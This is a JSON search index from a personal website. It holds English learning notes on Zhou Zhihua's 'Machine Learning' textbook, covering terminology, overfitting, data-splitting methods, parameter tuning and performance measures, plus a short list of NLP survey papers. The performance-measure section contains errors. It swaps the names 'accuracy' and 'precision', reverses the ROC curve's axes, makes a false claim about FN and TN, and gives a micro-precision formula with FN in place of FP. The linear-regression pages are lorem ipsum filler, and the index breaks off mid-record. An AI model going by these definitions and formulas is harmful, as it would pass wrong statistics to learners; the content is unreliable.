[{"authors":["admin"],"categories":null,"content":"","date":1557619200,"expirydate":-62135596800,"kind":"taxonomy","lang":"en","lastmod":1557619200,"objectID":"2525497d367e79493fd32b198b28f040","permalink":"https://p0st3r.github.io/authors/admin/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/authors/admin/","section":"authors","summary":"","tags":null,"title":"","type":"authors"},{"authors":null,"categories":null,"content":"","date":1581206400,"expirydate":-62135596800,"kind":"section","lang":"en","lastmod":1581206400,"objectID":"f6ffcb72677277da6731ebc3652f7b65","permalink":"https://p0st3r.github.io/hack/","publishdate":"2020-02-09T00:00:00Z","relpermalink":"/hack/","section":"hack","summary":"Machine learning is one of the most exciting directions in information technology today, and its application has penetrated into all aspects of life and is closely related to the daily lives of ordinary people. This article is a Learning Note for the newly published \"Machine Learning\" textbook from Tsinghua University, written by Professor Zhou Zhihua of Nanjing University.","tags":null,"title":"Hack","type":"docs"},{"authors":null,"categories":null,"content":"Machine learning is one of the most exciting directions in information technology today, and its application has penetrated into all aspects of life and is closely related to the daily lives of ordinary people.\nThe Machine Learning textbook from Tsinghua University, written by Professor Zhou Zhihua of Nanjing University, also known as the Watermelon Book, is a comprehensive book that introduces different types of algorithms in machine learning (e.g. supervised learning, unsupervised learning, semi-supervised learning, reinforcement learning, integrated downscaling, feature selection, etc.)\nThis documents is a Learning Note for Machine Learning, a record of my understanding and expanding knowledge points during the learning process, and a tribute to predecessors and knowledge.\n","date":1581206400,"expirydate":-62135596800,"kind":"section","lang":"en","lastmod":1581206400,"objectID":"452130f672ce927947f38d6a77d60e40","permalink":"https://p0st3r.github.io/ml/","publishdate":"2020-02-09T00:00:00Z","relpermalink":"/ml/","section":"ml","summary":"Machine learning is one of the most exciting directions in information technology today, and its application has penetrated into all aspects of life and is closely related to the daily lives of ordinary people. This article is a Learning Note for the newly published *Machine Learning* textbook from Tsinghua University, written by Professor Zhou Zhihua of Nanjing University.","tags":null,"title":"Machine Learning","type":"docs"},{"authors":null,"categories":null,"content":"Named Entity Recognition  \rA Survey on Deep Learning for Named Entity Recognitionarxiv.org  Relation Extraction  \rMore Data, More Relations, More Context and More Openness: A Review and Outlook for Relation Extraction  Text Classification  \rDeep Learning Based Text Classification: A Comprehensive Review  Pre-trained Models   \rPre-trained Models for Natural Language Processing: A Survey\n  \rA Survey on Contextual Embeddings\n  Knowlege Graphs   \rA Survey on Knowledge Graphs: Representation, Acquisition and Applications\n  \rKnowledge Graphs\n  ","date":1581206400,"expirydate":-62135596800,"kind":"section","lang":"en","lastmod":1581206400,"objectID":"1eeb010c04a6548d32dfe2ac7b17ebc5","permalink":"https://p0st3r.github.io/nlp/","publishdate":"2020-02-09T00:00:00Z","relpermalink":"/nlp/","section":"nlp","summary":"Machine learning is one of the most exciting directions in information technology today, and its application has penetrated into all aspects of life and is closely related to the daily lives of ordinary people. This article is a Learning Note for the newly published \"Machine Learning\" textbook from Tsinghua University, written by Professor Zhou Zhihua of Nanjing University.","tags":null,"title":"Natural Language Processing","type":"docs"},{"authors":null,"categories":null,"content":"Just as we judge tomorrow\u0026rsquo;s weather based on past experience, eaters want to pick a good melon from their past experience, so can a computer help humans to make that happen? If there is such a discipline, where human \u0026ldquo;experience\u0026rdquo; corresponds to the \u0026ldquo;data\u0026rdquo; in the computer, and the computer learns this empirical data to generate an algorithmic model that allows the computer to make valid judgments in the face of new situations, and that is Machine Learning.\nMitchell, author of another classic textbook, gives a formal definition that assumes:\n P: The performance of a computer program on a task class $T$. T: The type of task the computer program wants to achieve. E: Denotes experience, i.e., a historical data set.  If the computer program obtained an improvement in performance $P$ on task $T$ by using experience $E$, the program is said to have learned from $E$.\n","date":1557010800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1557010800,"objectID":"34d0da2c74017d73365bbd0042f893ff","permalink":"https://p0st3r.github.io/ml/ch1_1/","publishdate":"2019-05-05T00:00:00+01:00","relpermalink":"/ml/ch1_1/","section":"ml","summary":"Just as we judge tomorrow\u0026rsquo;s weather based on past experience, eaters want to pick a good melon from their past experience, so can a computer help humans to make that happen?","tags":null,"title":"Definition","type":"docs"},{"authors":null,"categories":null,"content":"Data Suppose we collect data on a batch of watermelons, e.g.:\n  (color=green; rootstock=crumpled; knock=muddy)\n  (color=black; rootstock=slightly crumpled; knock=dull)\n  (color=light from; rootstock=hard; knock=crisp)\u0026hellip;\n  Each pair of brackets is a record of a watermelon. Definitions:\n  Data Set: The collection of all records is data set.\n  Sample: Each record is an instance or sample.\n  Feature or Attribute: A single feature is: a feature or attribute. e.g. color or percussion.\n  Vector: For each record represented on the axis can be represented by a vector. e.g. (green, huddled, turbid), i.e. each watermelon is: a feature vector.\n  Dimensionality: The number of characteristics of a sample is dimensionality.\n  Dimensional Disaster: The watermelon\u0026rsquo;s example dimension is 3, when the dimensionality is very large and it called dimensional disaster.\n  Data Set When a computer program learns empirical data to generate an algorithm model, each record is called a training sample, and when the model is trained and we want to test the model\u0026rsquo;s performance with new samples, each new sample is called a test sample. Definitions:\n  Training Set: The set of all training samples is training set, [special].\n  Test Set: The set of all test samples is test set , [general].\n  Generalization: The ability of the machine-learned model to apply to the new sample is generalization. i.e. from special to general.\n  Classfication In the case of the watermelon, we want the computer to train a decision model to determine whether a new watermelon is a good watermelon or not by learning data about its characteristics. What we can tell is: whether watermelon is good or bad, which is a discrete value. Likewise, there are projections of future population numbers by using population data from previous years, which are continuous values. Definitions:\n  Classfication: The problem where the predicted values are discrete is classification.\n  Regression: The problem where the predicted values are continuous is regression.\n  Method of learning In our process of predicting, it is clear that we already know in advance whether the melon in the training set is a good or bad, the learner learns the characteristics of these melons and thus concludes the law. The watermelon in the training set have been marked, called marking information.\nBut there are also cases where the information is not marked. For example, we want to divide a pile of watermelons into two small piles according to their characteristics, so that the watermelons in a pile are as similar as possible. For this problem, we do not know beforehand how good or bad the watermelons are, the samples are not marked with information. Definitions:\n  Supervised Learning: The learning task for which the training data has tagged information is supervised learning, and it is easy to know that both the classification and regression described above are supervised learning categories.\n  Unsupervised Learing: The learning tasks for which the training data is not labeled with information are unsupervised learning, commonly known as clustering and association rules.\n  ","date":1557010800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1557010800,"objectID":"2d025d8911cfa253e96c50d29617a4be","permalink":"https://p0st3r.github.io/ml/ch1_2/","publishdate":"2019-05-05T00:00:00+01:00","relpermalink":"/ml/ch1_2/","section":"ml","summary":"Data Suppose we collect data on a batch of watermelons, e.g.:\n  (color=green; rootstock=crumpled; knock=muddy)\n  (color=black; rootstock=slightly crumpled; knock=dull)\n  (color=light from; rootstock=hard; knock=crisp)\u0026hellip;\n  Each pair of brackets is a record of a watermelon.","tags":null,"title":"Terms","type":"docs"},{"authors":null,"categories":null,"content":"Error The difference between the learner\u0026rsquo;s actual prediction of the sample and the true value of the sample is called \u0026lsquo;error\u0026rsquo;. Definitions:\n  \u0026lsquo;Training Error\u0026rsquo; or \u0026lsquo;Empirical Error\u0026rsquo;: Error in the training set\n  \u0026lsquo;Test Error\u0026rsquo;: Error in the test set\n  \u0026lsquo;generalization error\u0026rsquo;: The learner\u0026rsquo;s error in all new samples\n  Overfitting Apparently, we want learners perform well on the new sample which with small generalization errors. Therefore, the learners should be able to learn as many universal general characterisitics from the training set as possible, so as to make the correct discrimination when encountering new samples.\nHowever, when learners learn the traing set too wel that take some of the training sample\u0026rsquo;s own characteristics as a general feature; there are also cases where the learning capacity is insufficient to learn the basic characteristics of the training set. Definitions:\n  \u0026lsquo;Overfitting\u0026rsquo;: Over-learning to the point of learning the not-so-generic characteristics included in the training sample\n  \u0026lsquo;Underfitting\u0026rsquo;: The learning ability is so poor that the general properties of the training sample have not been learned well\n  It is known that in the overfitting problem, the training error is very small, but the test error is large; in the underfitting problem, both the training error and the test error are large. Currently, the underfitting problem is relatively easy to overcome, such as increasing the number of iterations, but there is still no very good solution to the overfitting problem, and overfitting is a key obstacle to machine learning.\n","date":1557010800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1557010800,"objectID":"fae77392dc93d5ec40e915530477b931","permalink":"https://p0st3r.github.io/ml/ch2_1/","publishdate":"2019-05-05T00:00:00+01:00","relpermalink":"/ml/ch2_1/","section":"ml","summary":"Error The difference between the learner\u0026rsquo;s actual prediction of the sample and the true value of the sample is called \u0026lsquo;error\u0026rsquo;. Definitions:\n  \u0026lsquo;Training Error\u0026rsquo; or \u0026lsquo;Empirical Error\u0026rsquo;: Error in the training set","tags":null,"title":"Error and overfitting","type":"docs"},{"authors":null,"categories":null,"content":"In realistic tasks, we often have multiple algorithms to choose from, so how do chonse the best one for us? As mentioned in last chapter, we want the learner with the \u0026lsquo;smallest generalization error\u0026rsquo;, and the ideal solution is to evaluate the generalization error of the model and select the smallest one. However, the generalization error refers to the ability of the model to be applied to all new samples that we do not have direct access to the it.\nThus, we usually use a \u0026lsquo;test set\u0026rsquo; to test the learner\u0026rsquo;s ability to discriminate on new samples, and then use the test error on the test set as an approximation of the generalization error. Obviously the test set which we select should be as mutually exclusive as possible with the training set, and here\u0026rsquo;s a little story to explain why.\nSuppose the teacher has 10 questions for the students to practice, and uses the same 10 questions for the test, however some children may could only do these 10 questions and get a high score. It is clear that the score does not reflect the real level effectively.\nIn our task, we would like to have a well generalized models, as the teacher would like the students not only learned the course well but also gained the ability to think about what they have learned.\nTraining samples are equivalent to the exercises for students to practice, and the testing process is equivalent to an exam. If the test sample had been used for training, it would have been an over-optimistic estimate.\n","date":1557010800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1557010800,"objectID":"856c3f6cae2a84d0d9b46b21a1f1928e","permalink":"https://p0st3r.github.io/ml/ch2_2/","publishdate":"2019-05-05T00:00:00+01:00","relpermalink":"/ml/ch2_2/","section":"ml","summary":"In realistic tasks, we often have multiple algorithms to choose from, so how do chonse the best one for us? As mentioned in last chapter, we want the learner with the \u0026lsquo;smallest generalization error\u0026rsquo;, and the ideal solution is to evaluate the generalization error of the model and select the smallest one.","tags":null,"title":"Method of Evaluation","type":"docs"},{"authors":null,"categories":null,"content":"In order to use the test error of a test set as an approximation of the generalization error, we need to effectively split the initial data set into mutually exclusive training sets and test sets. The following are some common methods.\nHold-out Divide the data set $D$ into two mutually exclusive sets, one as the training set $S$ and one as the test set $T$, satisfying $D=S{\\cup}T$ and $S{\\cap}T=\\phi$. The common division is about 2/3-4/5 samples are used for training and the rest for testing.\nIt is notable that the division of the training/test sets should be as consistent as possible in the distribution of the data to avoid additional bias, the stratification is commonly used to sovle this problem.\nAt the same time, the results of the single hold-out are often not stable enough due to the random nature of the division, and generally we take the average of a number of random division repeated experiments.\nCross Validation Divide the data set $D$ into $k$ mutually exclusive subsets of equal size, satisfying $D=D_1{\\cup}D_2{\\cup}\u0026hellip; {\\cup}D_k$, $D_i{\\cap}D_j=\\phi (i{\\neq}j)$, similarly using stratification to obtain these subsets that keeping the data distribution as consistent as possible.\nThe idea of the cross-validation method is that each time a sum of $k-1$ subsets is used as the training set and the remaining is used as the test set, so as to obtain $k$ cases of training/test set division to do $k$ training \u0026amp;testing, and return the mean of the $k$ test results eventually.\nK-fold Cross Validation Cross-validation is also called K-fold Cross Validation, the most common value of $k$ is 10. The following gives a diagram of 10-fold cross-validation.\nLeave-One-Out Similar to the hold-out, the data set $D$ is divided into $k$ subsets at random. Therefore K-fold Cross Validation is usually repeated $p$ times as p-times k-fold Cross Validation, which is commonly 10-times 10-fold Cross Validation that performe 100 training/testing sessions.\nIn particular, when there is only one sample in each subsets of divied $k$ subsets, it is known as the Leave-One-Out. The results of the Leave-One-Out are more accurate, but with significant computer consumption.\nBootstrapping What we want to evaluate is the model that was trained with the whole $D$. However, in the Hold-out and Cross Validation, the actual evaluated model uses a smaller training set than $D$ because a portion of the sample is retained for testing, which inevitably introduces some estimation biases due to differences in training sample size. The Leave-One-Out is less affected by changes in training sample size, but the computational complexity is too high. The Bootstrapping solves precisely that problem.\nThe basic idea of the Bootstrapping is given a dataset $D$ containing $m$ samples, randomly selected from $D$ one sample at a time copied into $D'$, and then put it back into the initial dataset $D$ to be picked up at the next sampling. Repeating $m$ times to obtain a dataset $D'$ containing $m$ samples.\nIt can be known that the limit of the probability that the sample remain uncollected in $m$ times of sampling is:\n${\\lim\\limits_{m\\to\\infty}}{(1-\\frac{1}{m})^m\\to\\frac{1}{e}\\approx0.368}$\nThus, approximately 36.8% of the initial sample set $D$ did not appear in $D'$ through bootstrapping sampling, so $D'$ could be used as the training set and $D-D'$ as the test set. The Bootstrapping is useful when the data set is small which is difficult to spilt the training/test set effectively, however it introduces estimation bias because the data set generated by the bootstraping (random sampling) alters the distribution of the initial data set. When the initial data set is sufficient, Hold-out and Cross Validation are more commonly used.\n","date":1557010800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1557010800,"objectID":"b1989b261e334ea4c579f280c19f3398","permalink":"https://p0st3r.github.io/ml/ch2_3/","publishdate":"2019-05-05T00:00:00+01:00","relpermalink":"/ml/ch2_3/","section":"ml","summary":"In order to use the test error of a test set as an approximation of the generalization error, we need to effectively split the initial data set into mutually exclusive training sets and test sets.","tags":null,"title":"Split Traing set and Test set","type":"docs"},{"authors":null,"categories":null,"content":"Most learning algorithms have some parameters that need to be set, which is commonly referred to as parameter tuning, and the performance of the learned model often varies significantly depending on the parameter configuration.\nMany parameters of the learning algorithm are taken in the real range, so it is not feasible to train a model for each parameter. It is common to select a range and step $\\lambda$ for each parameter, which makes the learning process feasible.\nFor example, assuming that the algorithm has 3 parameters, each considering only 5 candidate values, there are $5^3$ = $125$ models to examine for each training/test set.\nIt is notable that once the model and paramters have been set, we need to retrain the model using the initial dataset $D$. This means that the test set initially divided for evaluation is also learned by the model to enhance the learning effct.\n","date":1557010800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1557010800,"objectID":"6a04aa7933f6493b5f4168c850dd62bf","permalink":"https://p0st3r.github.io/ml/ch2_4/","publishdate":"2019-05-05T00:00:00+01:00","relpermalink":"/ml/ch2_4/","section":"ml","summary":"Most learning algorithms have some parameters that need to be set, which is commonly referred to as parameter tuning, and the performance of the learned model often varies significantly depending on the parameter configuration.","tags":null,"title":"Parameter Tuning","type":"docs"},{"authors":null,"categories":null,"content":"Performance measures are evaluation criteria that measure the ability of models to generalize, and when comparing the ability of different models, different performance measures often results in different judgments.\nThe Most Common Performance Measures Mean Squared Erro In the regression task which predict continuous values, the most commonly used is the Mean Squared Error, many classical algorithms are using MSE as an evaluation function.\n$E(f;D)=\\frac{1}{m}\\sum\\limits_{i=1}^{m}(f(x_i)-y_i)^2$\nMore generally, for data distribution $\\mathcal{D}$ and probability density functions $p(\\cdot)$, the MSE can be described as\n$E(f;\\mathcal{D})=\\int_{x\\sim\\mathcal{D}}(f(x)-y)^2p(x)dx$\nError rate \u0026amp; Precision In the classification task which predict discrete values, the most commonly used are error rate and precision, where error rate is the number of samples classified incorrectly as a proportion of the total number of samples, and precision is the number of correctly classified samples as a proportion of the total number of samples, easily known that error rate + precision = 1.\nError rate is defined as:\n$E(f;D)=\\frac{1}{m}\\sum\\limits_{i=1}^{m}\\mathbb I(f(x_i)\\neq{y_i})$\nPrecision is defined as:\n$\\begin{align*}acc(f;D)\u0026amp;=\\frac{1}{m}\\sum\\limits_{i=1}^{m}\\mathbb I(f(x_i)=y_i)=1-E(f;D)\\end{align*}$\nMore generally, for data distribution $\\mathcal{D}$ and probability density functions $p(\\cdot)$, the Error Rate and Precision can be described as:\n$E(f;\\mathcal{D})=\\int_{x\\sim\\mathcal{D}}\\mathbb I(f(x)\\neq{y})p(x)dx$\n$acc(f;\\mathcal{D})=\\int_{x\\sim\\mathcal{D}}\\mathbb I(f(x)=y)p(x)dx=1-E(f;\\mathcal{D})$\nAccuracy/Recall/F1 For example, in a recommendation system, we only care about whether the content pushed to the user is of interest to the user (i.e. accuracy), or how much of all the content of interest to the user we pushed (i.e. recall). Therefore, the search accuracy/recall is more appropriate to describe such issues. For the binary classification, the classification result confusion matrix and the accuracy/racall are defined as follows:\n\r\rFact\rPrediction\r\rPositive\rNegative\r\r\r\rPositive\rTP(Ture Positive)\rFN(False Negative)\r\rNegative\rFP(False Positive)\rTN(Ture Negative)\r\r\rAccuracy $P$ and Recall $R$ are defined as:\n$P=\\frac{TP}{TP+FP}$\n$R=\\frac{TP}{TP+FN}$\nAccuracy and Recall are a pair of contradictory measures. For example, if we want content pushed to be as interesting as possible to all users, we can only push the content which is certainly so that some content users are interestd will be missed, leads to low racall; if we want all the content which users are interested pushed, we only push all the content so that accuracy is very low.\nThe P-R curve is precisely the curve describing the change of the accuracy/racall, the P-R curve is defined as follows: according to the prediction result of the learner (generally a real value or probability), the test samples are ranked, the samples most likely to be the positive example in the front, the least likely to be the positive example in the back, and the samples are predicted as the positive example one by one in this order, and the current $P$ and $R$ values are calculated each time, as shown in the figure below:\nHow is the P-R curve evaluated? If the P-R curve of one learner $A$ is completely covered by the P-R curve of another learner $B$, then the performance of $B$ is better than that of $A$. If the curves of $A$ and $B$ intersect, then who has a larger area under the curve and whose performance is better. But in general, the area under the curve is difficult to estimate, so the \u0026ldquo;Break-Event Point\u0026rdquo; (BEP) is derived, i.e. when P=R, the higher the value of the Break-Event Point, the better the performance.\nThe P and R indicators are sometimes contradictory, so they need to be considered together, and the most common method is F-Measure, also known as F-Score, which is a weighted reconciliation average of $P$ and $R$. i.e.\n$\\frac{1}{F_\\beta}=\\frac{1}{1+\\beta^2}\\cdot(\\frac{1}{P}+\\frac{\\beta^2}{R})$\n$F_\\beta=\\frac{(1+\\beta^2)\\times{P}\\times{R}}{(\\beta^2\\times{P})+R}$\nn particular, when $\\beta=1$ it becomes the common $F1$ measure, is a reconciled average of $P$ and $R$, the better the model performs when $F1$ is higher.\n$\\frac{1}{F1}=\\frac{1}{2}\\cdot(\\frac{1}{P}+\\frac{1}{R})$\n$F1=\\frac{2\\times{P}\\times{R}}{P+R}=\\frac{2\\times{TP}}{ALL+TP-TN}$\nSometimes we have multiple bicategorical confusion matrices, e.g., multiple trainings or training on multiple datasets, then there are two ways to estimate global performance, which are macro and micro. Macro is to calculate the $P$ and $R$ values of each confusion matrix first, then obtain the average P value $macroP$ and the average R value $macroR$ to calculating $F\\beta$ or $F1$, while micro is to calculate the average TP, FP, TN, FN of the confusion matrix, then calculate $P$, $R$, and thus $F\\beta$ or $F1$.\n$macroP=\\frac{1}{n}\\sum\\limits_{i=1}^{n}P_i$\n$macroR=\\frac{1}{n}\\sum\\limits_{i=1}{n}R_i$\n$macro-F1=\\frac{2\\times{macroP}\\times{macroR}}{macroP+macroR}$\n$microP=\\frac{\\overline{TP}}{\\overline{TP}+\\overline{FN}}$\n$microF1=\\frac{2\\times{microP}\\times{microR}}{microP+microR}$\nROC \u0026amp; AUC The ROC curve is very similar to the P-R curve, both are predicted according to the positive cases one by one according to the order of the order, the difference is that the ROC curve takes the \u0026ldquo;True Positive Rate\u0026rdquo; (TPR) as the horizontal axis and the vertical axis as the \u0026ldquo;False Positive Rate\u0026rdquo; (FPR), the ROC focuses on studying the order of the test sample based on the evaluation value.\n$TPR=\\frac{TP}{TP+FN}$\n$FPR=\\frac{FP}{TN+FP}$\nA simple analysis of the image shows that when FN=0, TN must also be 0, and vice versa. We can draw a queue and try to split the queue using different truncation points (i.e. thresholds) to analyze the shape of the curve, (0,0) means that all samples are predicted as negative cases, (1,1) means that all samples are predicted as positive cases, (0,1) means the ideal case that all positive cases appear before negative cases, (1,0) means the worst case that all negative cases appear before positive cases.\nSimilarly, if the ROC curve of one learner $A$ is completely covered by the other learner $B$, the performance of $B$ is said to superior to that of $A$. If the curves of A and B intersect, then whose curve has more area under it and whose performance is better. The Area under the ROC Curve is defined as AUC (Area Uder ROC Curve). Different from P-R, the AUC here is estimable,i.e. the sum of the Area of each small rectangle under the AOC Curve. It\u0026rsquo;s easy to see that the larger the AUC is, the better the quality of the sort. When the AUC is 1, it mean that all the positive examples are in front of the negative ones, and when the AUC is 0 means all the negative examples are in front of the positive ones.\n$AUC=\\frac{1}{2}\\sum\\limits_{i=1}^{m-1}(x_{i+1}-x_i)\\cdot(y_i+y_{i+1})$\nCost-sensitive Error Rate \u0026amp; Cost Curve In the above approach, the mistakes of the learner are treated equally, but in reality the cost of predicting positive samples into negative is often not the same as predicting negative samples into positive, e.g., predicting no disease \u0026ndash;\u0026gt; having disease just increases the number of checks, but having disease \u0026ndash;\u0026gt; no disease increases the risk to life. Take the binary classification for example, which thus introduces a cost matrix.\n\r\rFact\rPrediction\r\rclass 0\rclass 1\r\r\r\rclass 0\r0\r$cost_{10}$\r\rclass 1\r$cost_{01}$\r0\r\r\rUnder non-equal error costs, we want to minimize the overall cost so that the cost-sensitive error rate is:\n$E(f;D;cost)=\\frac{1}{m}(\\sum\\limits_{x_i\\in{D}^+}\\mathbb I(f(x_i)\\neq{y_i})\\times{cost_{01}}+\\sum\\limits_{x_i\\in{D^-}}{\\mathbb I}(f(x_i)\\neq{y_i})\\times{cost_{10}})$\nSimilarly, for the ROC curve, it evolves into a cost curve at non-equal error costs, where the horizontal axis of the cost curve is the probability cost of taking the positive case between [0,1], where $p$ is the probability of taking the positive case, and the vertical axis is the normalized cost of taking the value [0,1].\n$P(+)cost=\\frac{p\\times{cost_{01}}}{p\\times{cost_{01}}+(1-p)\\times{cost_{10}}}$\n$cost_{norm}=\\frac{FNR\\times{p}\\times{cost_{01}}+FPR\\times(1-p)\\times{cost_{10}}}{p\\times{cost_{01}}+(1-p)\\times{cost_{10}}}$\nPlot the cost curve is simple: set the coordinates of a point on the ROC curve as (TPR, FPR) to calculated FNR, then plot a line segment from (0, FPR) to (1, FNR) in the cost plane, the area under the line segment represents the desired overall cost under that condition, so transform each point of the ROC curve earth into a line segment in the cost plane, and take the lower boundary of all line segments, the enclosed area is the desired overall cost of the learner under all conditions, as shown in the figure:\n","date":1557010800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1557010800,"objectID":"8baaea4519e7488034a91eb5a8e9ccdb","permalink":"https://p0st3r.github.io/ml/ch2_5/","publishdate":"2019-05-05T00:00:00+01:00","relpermalink":"/ml/ch2_5/","section":"ml","summary":"Performance measures are evaluation criteria that measure the ability of models to generalize, and when comparing the ability of different models, different performance measures often results in different judgments.\nThe Most Common Performance Measures Mean Squared Erro In the regression task which predict continuous values, the most commonly used is the Mean Squared Error, many classical algorithms are using MSE as an evaluation function.","tags":null,"title":"Performance Measure","type":"docs"},{"authors":null,"categories":null,"content":"lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum. Sed ac faucibus dolor, scelerisque sollicitudin nisi. Cras purus urna, suscipit quis sapien eu, pulvinar tempor diam. Quisque risus orci, mollis id ante sit amet, gravida egestas nisl. Sed ac tempus magna. Proin in dui enim. Donec condimentum, sem id dapibus fringilla, tellus enim condimentum arcu, nec volutpat est felis vel metus. Vestibulum sit amet erat at nulla eleifend gravida.\nNullam vel molestie justo. Curabitur vitae efficitur leo. In hac habitasse platea dictumst. Sed pulvinar mauris dui, eget varius purus congue ac. Nulla euismod, lorem vel elementum dapibus, nunc justo porta mi, sed tempus est est vel tellus. Nam et enim eleifend, laoreet sem sit amet, elementum sem. Morbi ut leo congue, maximus velit ut, finibus arcu. In et libero cursus, rutrum risus non, molestie leo. Nullam congue quam et volutpat malesuada. Sed risus tortor, pulvinar et dictum nec, sodales non mi. Phasellus lacinia commodo laoreet. Nam mollis, erat in feugiat consectetur, purus eros egestas tellus, in auctor urna odio at nibh. Mauris imperdiet nisi ac magna convallis, at rhoncus ligula cursus.\nCras aliquam rhoncus ipsum, in hendrerit nunc mattis vitae. Duis vitae efficitur metus, ac tempus leo. Cras nec fringilla lacus. Quisque sit amet risus at ipsum pharetra commodo. Sed aliquam mauris at consequat eleifend. Praesent porta, augue sed viverra bibendum, neque ante euismod ante, in vehicula justo lorem ac eros. Suspendisse augue libero, venenatis eget tincidunt ut, malesuada at lorem. Donec vitae bibendum arcu. Aenean maximus nulla non pretium iaculis. Quisque imperdiet, nulla in pulvinar aliquet, velit quam ultrices quam, sit amet fringilla leo sem vel nunc. Mauris in lacinia lacus.\nSuspendisse a tincidunt lacus. Curabitur at urna sagittis, dictum ante sit amet, euismod magna. Sed rutrum massa id tortor commodo, vitae elementum turpis tempus. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean purus turpis, venenatis a ullamcorper nec, tincidunt et massa. Integer posuere quam rutrum arcu vehicula imperdiet. Mauris ullamcorper quam vitae purus congue, quis euismod magna eleifend. Vestibulum semper vel augue eget tincidunt. Fusce eget justo sodales, dapibus odio eu, ultrices lorem. Duis condimentum lorem id eros commodo, in facilisis mauris scelerisque. Morbi sed auctor leo. Nullam volutpat a lacus quis pharetra. Nulla congue rutrum magna a ornare.\nAliquam in turpis accumsan, malesuada nibh ut, hendrerit justo. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Quisque sed erat nec justo posuere suscipit. Donec ut efficitur arcu, in malesuada neque. Nunc dignissim nisl massa, id vulputate nunc pretium nec. Quisque eget urna in risus suscipit ultricies. Pellentesque odio odio, tincidunt in eleifend sed, posuere a diam. Nam gravida nisl convallis semper elementum. Morbi vitae felis faucibus, vulputate orci placerat, aliquet nisi. Aliquam erat volutpat. Maecenas sagittis pulvinar purus, sed porta quam laoreet at.\n","date":1557010800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1557010800,"objectID":"5dc2f9ca341abb0381f02a2af7fcc06f","permalink":"https://p0st3r.github.io/ml/ch3_1/","publishdate":"2019-05-05T00:00:00+01:00","relpermalink":"/ml/ch3_1/","section":"ml","summary":"lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum. Sed ac faucibus dolor, scelerisque sollicitudin nisi. Cras purus urna, suscipit quis sapien eu, pulvinar tempor diam.","tags":null,"title":"Linear regression","type":"docs"},{"authors":null,"categories":null,"content":"lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum. Sed ac faucibus dolor, scelerisque sollicitudin nisi. Cras purus urna, suscipit quis sapien eu, pulvinar tempor diam. Quisque risus orci, mollis id ante sit amet, gravida egestas nisl. Sed ac tempus magna. Proin in dui enim. Donec condimentum, sem id dapibus fringilla, tellus enim condimentum arcu, nec volutpat est felis vel metus. Vestibulum sit amet erat at nulla eleifend gravida.\nNullam vel molestie justo. Curabitur vitae efficitur leo. In hac habitasse platea dictumst. Sed pulvinar mauris dui, eget varius purus congue ac. Nulla euismod, lorem vel elementum dapibus, nunc justo porta mi, sed tempus est est vel tellus. Nam et enim eleifend, laoreet sem sit amet, elementum sem. Morbi ut leo congue, maximus velit ut, finibus arcu. In et libero cursus, rutrum risus non, molestie leo. Nullam congue quam et volutpat malesuada. Sed risus tortor, pulvinar et dictum nec, sodales non mi. Phasellus lacinia commodo laoreet. Nam mollis, erat in feugiat consectetur, purus eros egestas tellus, in auctor urna odio at nibh. Mauris imperdiet nisi ac magna convallis, at rhoncus ligula cursus.\nCras aliquam rhoncus ipsum, in hendrerit nunc mattis vitae. Duis vitae efficitur metus, ac tempus leo. Cras nec fringilla lacus. Quisque sit amet risus at ipsum pharetra commodo. Sed aliquam mauris at consequat eleifend. Praesent porta, augue sed viverra bibendum, neque ante euismod ante, in vehicula justo lorem ac eros. Suspendisse augue libero, venenatis eget tincidunt ut, malesuada at lorem. Donec vitae bibendum arcu. Aenean maximus nulla non pretium iaculis. Quisque imperdiet, nulla in pulvinar aliquet, velit quam ultrices quam, sit amet fringilla leo sem vel nunc. Mauris in lacinia lacus.\nSuspendisse a tincidunt lacus. Curabitur at urna sagittis, dictum ante sit amet, euismod magna. Sed rutrum massa id tortor commodo, vitae elementum turpis tempus. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean purus turpis, venenatis a ullamcorper nec, tincidunt et massa. Integer posuere quam rutrum arcu vehicula imperdiet. Mauris ullamcorper quam vitae purus congue, quis euismod magna eleifend. Vestibulum semper vel augue eget tincidunt. Fusce eget justo sodales, dapibus odio eu, ultrices lorem. Duis condimentum lorem id eros commodo, in facilisis mauris scelerisque. Morbi sed auctor leo. Nullam volutpat a lacus quis pharetra. Nulla congue rutrum magna a ornare.\nAliquam in turpis accumsan, malesuada nibh ut, hendrerit justo. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Quisque sed erat nec justo posuere suscipit. Donec ut efficitur arcu, in malesuada neque. Nunc dignissim nisl massa, id vulputate nunc pretium nec. Quisque eget urna in risus suscipit ultricies. Pellentesque odio odio, tincidunt in eleifend sed, posuere a diam. Nam gravida nisl convallis semper elementum. Morbi vitae felis faucibus, vulputate orci placerat, aliquet nisi. Aliquam erat volutpat. Maecenas sagittis pulvinar purus, sed porta quam laoreet at.\n","date":1557010800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1557010800,"objectID":"a7138af14c850600e80b5d034026eab8","permalink":"https://p0st3r.github.io/ml/ch3_2/","publishdate":"2019-05-05T00:00:00+01:00","relpermalink":"/ml/ch3_2/","section":"ml","summary":"lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum. Sed ac faucibus dolor, scelerisque sollicitudin nisi. Cras purus urna, suscipit quis sapien eu, pulvinar tempor diam.","tags":null,"title":"Linear probability 